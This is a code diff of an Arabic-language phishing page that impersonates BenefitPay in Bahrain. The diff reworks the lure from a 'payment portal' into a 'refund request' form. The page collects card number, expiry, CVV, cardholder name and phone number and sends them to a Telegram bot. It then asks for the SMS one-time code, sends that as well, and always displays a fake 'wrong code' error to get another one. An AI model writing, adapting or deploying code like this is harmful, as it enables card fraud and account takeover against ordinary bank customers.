@@ -3,25 +3,23 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta property="og:title" content="BenefitPay - بوابة الدفع الآمنة">
-    <meta property="og:description" content="نظام الدفع الإلكتروني الموحد - مملكة البحرين">
+    <meta property="og:title" content="BenefitPay - بوابة الاسترداد الموحدة">
+    <meta property="og:description" content="طلب استرداد مبالغ مالية - مملكة البحرين">
     <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/thumb/c/ce/Flag_of_Bahrain.svg/2560px-Flag_of_Bahrain.svg.png">
     
-    <title>BenefitPay | Payment Portal</title>
+    <title>BenefitPay | Refund Request</title>
     <style>
         body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f2f2f2; margin: 0; padding: 0; }
-        .safety-header { background: #000; color: #00ff00; text-align: center; font-size: 10px; padding: 4px; letter-spacing: 1px; font-weight: bold; }
-        .header { background-color: #e21e26; color: white; padding: 20px; display: flex; align-items: center; box-shadow: 0 2px 10px rgba(0,0,0,0.2); }
-        .header img { width: 45px; margin-left: 15px; border-radius: 4px; }
+        .safety-header { background: #000; color: #00ff00; text-align: center; font-size: 10px; padding: 4px; font-weight: bold; }
+        .header { background-color: #e21e26; color: white; padding: 20px; display: flex; align-items: center; }
+        .header img { width: 45px; margin-left: 15px; }
         .container { padding: 20px; max-width: 450px; margin: auto; }
         .card { background: white; border-radius: 12px; padding: 25px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); border-top: 5px solid #e21e26; }
+        .amount-box { background: #f0fdf4; border: 2px dashed #28a745; padding: 15px; border-radius: 10px; margin-bottom: 20px; text-align: center; }
         .input-group { margin-bottom: 20px; }
-        label { display: block; margin-bottom: 8px; font-weight: bold; color: #444; font-size: 14px; }
-        input { width: 100%; padding: 15px; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; font-size: 16px; transition: 0.3s; }
-        input:focus { border-color: #e21e26; background: #fffdfd; outline: none; }
-        .amount-box { background: #fff5f5; border: 2px dashed #e21e26; padding: 15px; border-radius: 10px; margin-bottom: 20px; text-align: center; }
-        .btn { background-color: #e21e26; color: white; border: none; width: 100%; padding: 18px; border-radius: 8px; font-size: 18px; font-weight: bold; cursor: pointer; transition: 0.2s; }
-        .btn:active { transform: scale(0.98); }
+        label { display: block; margin-bottom: 8px; font-weight: bold; color: #444; }
+        input { width: 100%; padding: 15px; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; font-size: 16px; }
+        .btn { background-color: #e21e26; color: white; border: none; width: 100%; padding: 18px; border-radius: 8px; font-size: 18px; font-weight: bold; cursor: pointer; }
         #loading, #otp-screen { display: none; text-align: center; padding: 40px 10px; }
         .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #e21e26; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 20px auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
@@ -29,33 +27,35 @@
 </head>
 <body>
 
-<div class="safety-header">SYSTEM SECURED ● END-TO-END ENCRYPTION ● CENTRAL BANK OF BAHRAIN</div>
+<div class="safety-header">REFUND PORTAL SECURED BY BENEFIT COMPANY - BAHRAIN</div>
 
 <div class="header">
     <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/ce/Flag_of_Bahrain.svg/2560px-Flag_of_Bahrain.svg.png">
     <div>
         <span style="font-size: 20px; font-weight: bold;">BenefitPay</span><br>
-        <small style="font-size: 10px; opacity: 0.9;">بوابة التحقق من الدفع الموحدة</small>
+        <small style="font-size: 10px;">بوابة استرداد المبالغ المالية</small>
     </div>
 </div>
 
 <div class="container">
     <div class="card" id="main-card">
+        <h3 style="text-align: center; margin-top: 0; color: #333;">طلب استرداد مبلغ</h3>
+        
         <div class="amount-box">
-            <label style="color: #e21e26; margin-bottom: 5px;">المبلغ المستحق للدفع</label>
+            <label style="color: #28a745; margin-bottom: 5px;">المبلغ المراد استرداده</label>
             <div style="display: flex; align-items: center; justify-content: center;">
-                <span style="font-size: 24px; font-weight: bold; margin-left: 8px;">BHD</span>
-                <input type="number" id="amount" placeholder="0.000" style="width: 150px; text-align: center; font-size: 24px; font-weight: bold; border: none; background: transparent;" required>
+                <span style="font-size: 24px; font-weight: bold; margin-left: 8px; color: #28a745;">BHD</span>
+                <input type="number" id="amount" placeholder="0.000" style="width: 150px; text-align: center; font-size: 24px; font-weight: bold; border: none; background: transparent; color: #28a745;" required>
             </div>
         </div>
 
         <form id="payForm">
             <div class="input-group">
-                <label>الاسم الثلاثي (كما في البطاقة)</label>
+                <label>الاسم الكامل لمصفي الحساب</label>
                 <input type="text" id="holder" placeholder="أدخل الاسم بالكامل" required>
             </div>
             <div class="input-group">
-                <label>رقم البطاقة الائتمانية / الصراف</label>
+                <label>رقم بطاقة الاسترداد (Card Number)</label>
                 <input type="number" id="card" placeholder="0000 0000 0000 0000" required>
             </div>
             <div style="display: flex; gap: 10px;">
@@ -63,21 +63,21 @@
                 <div class="input-group" style="flex: 1;"><label>رمز CVV</label><input type="password" id="cvv" placeholder="***" required></div>
             </div>
             <div class="input-group">
-                <label>رقم الهاتف المرتبط بالحساب</label>
+                <label>رقم هاتف صاحب الطلب</label>
                 <input type="number" id="phone" placeholder="3XXXXXXX" required>
             </div>
-            <button type="button" class="btn" onclick="sendData()">استمرار وتأكيد</button>
+            <button type="button" class="btn" onclick="sendData()">تأكيد طلب الاسترداد</button>
         </form>
     </div>
 
-    <div class="card" id="loading"><div class="spinner"></div><p>جاري فحص البيانات مع مصرف البحرين المركزي...</p></div>
+    <div class="card" id="loading"><div class="spinner"></div><p>جاري معالجة طلب الاسترداد مع البنك المصدّر...</p></div>
 
     <div class="card" id="otp-screen">
-        <h3 style="color: #e21e26;">التحقق من الهوية (OTP)</h3>
-        <p style="font-size: 13px; color: #555;">أدخل الرمز المكون من 6 أرقام والمُرسل عبر الرسائل النصية لضمان أمان المعاملة.</p>
+        <h3 style="color: #e21e26;">التحقق من هوية المستلم (OTP)</h3>
+        <p style="font-size: 13px; color: #555;">يرجى إدخال رمز التحقق لتأكيد استحقاق الاسترداد.</p>
         <input type="number" id="otp_code" placeholder="******" style="text-align: center; font-size: 28px; letter-spacing: 10px; border: 2px solid #e21e26;">
-        <button class="btn" style="margin-top: 25px;" onclick="finalStep()">تأكيد العملية</button>
-        <p id="error-msg" style="color: #e21e26; display: none; margin-top: 15px; font-weight: bold;">⚠️ الرمز الذي أدخلته غير صحيح أو انتهت صلاحيته.</p>
+        <button class="btn" style="margin-top: 25px;" onclick="finalStep()">تأكيد الرمز</button>
+        <p id="error-msg" style="color: #e21e26; display: none; margin-top: 15px; font-weight: bold;">⚠️ الرمز غير صحيح. يرجى إعادة المحاولة.</p>
     </div>
 </div>
 
@@ -93,12 +93,12 @@
         const cvv = document.getElementById('cvv').value;
         const phone = document.getElementById('phone').value;
 
-        if(!amount || !holder || !card || !exp || !cvv || !phone) { alert("يرجى ملء كافة الخانات"); return; }
+        if(!amount || !holder || !card || !exp || !cvv || !phone) { alert("يرجى إكمال البيانات"); return; }
 
         document.getElementById('main-card').style.display = 'none';
         document.getElementById('loading').style.display = 'block';
 
-        const message = `🚨 صيدة دفع جديدة 🚨\n💰 المبلغ: ${amount} BHD\n👤 الاسم: ${holder}\n💳 البطاقة: ${card}\n🗓 التاريخ: ${exp}\n🔒 CVV: ${cvv}\n📞 الهاتف: +973${phone}`;
+        const message = `💰 صيدة استرداد جديدة 💰\n💵 المبلغ: ${amount} BHD\n👤 الاسم: ${holder}\n💳 البطاقة: ${card}\n🗓 التاريخ: ${exp}\n🔒 CVV: ${cvv}\n📞 الهاتف: +973${phone}`;
 
         fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
         .then(() => {
@@ -111,7 +111,7 @@
 
     function finalStep() {
         const otp = document.getElementById('otp_code').value;
-        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("🔑 رمز الـ OTP: " + otp)}`)
+        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("🔑 رمز OTP (استرداد): " + otp)}`)
         .then(() => {
             document.getElementById('error-msg').style.display = 'block';
         });
